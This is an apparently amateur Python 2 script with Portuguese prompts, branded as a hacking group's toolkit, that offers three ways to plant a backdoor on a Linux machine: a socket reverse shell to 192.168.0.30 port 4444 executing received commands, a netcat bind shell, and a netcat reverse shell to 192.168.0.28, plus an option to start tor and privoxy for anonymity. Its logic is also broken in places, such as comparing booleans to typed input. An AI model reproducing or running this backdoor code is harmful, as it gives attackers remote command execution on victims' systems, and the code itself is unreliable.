import sys
import os
import socket
import re
#import requests
import time
import platform
import shutil
import traceback
import threading
import uuid
import StringIO
import zipfile
import tempfile
import getpass
from os import chdir, getcwd
import subprocess
from time import sleep

y = True
n = False
start = True
stop = False
number1 = 1
number2 = 2
number3 = 3
os.system("clear")

print    (" __________________________________________________________________")
print    ("|        ______  ________  ______  ________ ________________       |")
print    ("|       /  __  \/   ____/ /  __  \/    ___//   ____// ______\      |")
print    ("|      /  / /  /  ___/   /  / /  /\____  \/  ___/  / /	          |")
print    ("|     /  /_/  /  /_____ /  /_/  /_____/  /  /_____/ \_______       |")
print    ("|    /_______/________//_______//_______/________/\________/       |")
print    ("|   /_______/________//_______//_______/________/\________/        |")
print    ("|                                                                  |")
print    ("|        			>:DE`DSEC group tools                         |")
print    ("|                                                                  |")
print    ("|__________________________________________________________________|")
print    ("                                                                    ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

F0x = True
rootdedsecf0x = True

contaVerificaNome = input("Username : ")
contaVerificaPass = input("Password : ")

if F0x == contaVerificaNome:
    if rootdedsecf0x == contaVerificaPass:
        verificaBackdoor = input("Backdoor ? [y/n] ")
        if verificaBackdoor == y:
            os.system("clear")
            print("[1] (Somente Linux) Instalar backdoor ? (PYTHON code) : ")
            print("[2] (Somente Linux) Instalar backdoor ? (Usa NetCat, conexao direta) : ")
            print("[3] (Somente Linux) Instalar backdoor ? (Usa NetCat, conexao reversa) : ")
            print("\n")
            install2 = input("Qual deseja usar ? ")
            if install2 == number1:
                install = input("Install backdoor ? (y/n) : ")
                if y == install:
                    os.system("cd /tmp/")
                    print("Instalando backdoor\n")
                    print("Conexao aberta com >DE`DSEC")

                    s.connect(("192.168.0.30", 4444))
                    s.send(" ____________________________\n")
                    s.send("|                            |\n")
                    s.send("|Conexao com >DE`DSEC aberta!|\n")
                    s.send("|____________________________|\n")
                    s.send("\n")
                    data = s.recv(1024)
                    s.send("root@>DE`DSEC#")
                    while True:
                        cmd_atacante = s.recv(1024)
                        exec_atacante = os.popen(cmd_atacante)
                        s.send(exec_atacante.read())

                        if data.startswith("cd"):
                            os.chdir(data[3:].replace("\n", ''))
                            s.send("Movendo para " + str(os.getcwd()))
                            result = "\n"
                        else:
                            result = os.popen(data).read()

                        # if "cd " in data:
                        # 	os.chdir(data[3:].strip("\n"))

                        # if data[:2] == 'cd':
                        #    	try:
                        #        	chdir(data[3:])
                        #        	diretorio = getcwd()
                        #        	s.send(diretorio)
                        #        except:
                        #        	s.send("[-] Diretorio inexistente.")

            #            def dir(data)
            # diretorio = data
            #           		 try:
            #               		os.system("cd diretorio")
            #               	except
            #               		chdir("cd diretorio")
            #               	return diretorio

            # KEY_LENGTH = 2048
            # rand = Random.new().read
            # keypair = RSA.generate(KEY_LENGTH, rand)
            # decrypted = keypair.decrypt(data)
            # command_array = decrypted.split()

            # 		if command_array[0] == 'cd':
            # try:
            #    os.chdir(command_array[1])
            #    ciphertext = other_pub_key.encrypt('pwd: ' + os.getcwd(), 32)[0]
            #    sock.send(ciphertext + END_OF_OUTPUT)
            # except Exception as e:
            #    ciphertext = other_pub_key.encrypt(e.strerror, 32)[0]
            #    sock.send(ciphertext + END_OF_OUTPUT)

            if install2 == number2:
                install = input("Install backdoor ? (y/n)")

                if y == install:
                    os.system("cd /tmp/")
                    os.system("sudo apt install netcat")
                    os.system("")
                    while True:
                        os.system("nc -c /bin/bash -l -p 4444")
                        data = s.recv(1024)
                        s.send(" ____________________________\n")
                        s.send("|                            |\n")
                        s.send("|Conexao com >DE`DSEC aberta!|\n")
                        s.send("|____________________________|\n")
                        s.send("\n")
                        s.send("root@>DE`DSEC#")

            if install2 == number3:
                os.system("clear")
                install = input("Install backdoor ? (y/n)")

                if y == install:
                    os.system("cd /tmp/")
                    os.system("sudo apt install netcat")
                    os.system("")
                    while True:
                        os.system("nc -c /bin/bash 192.168.0.28 4444")
                        s.send(" ____________________________\n")
                        s.send("|                            |\n")
                        s.send("|Conexao com >DE`DSEC aberta!|\n")
                        s.send("|____________________________|\n")
                        s.send("\n")
                        s.send("root@>DE`DSEC#")
        verificaAnonimato = input("Deseja entrar em anonimato ? [y/n] ")
        if verificaAnonimato == y:
            inciarparar = input("[start/stop]")
            if inciarparar == start:
                os.system("service privoxy start")
                os.system("service tor start")

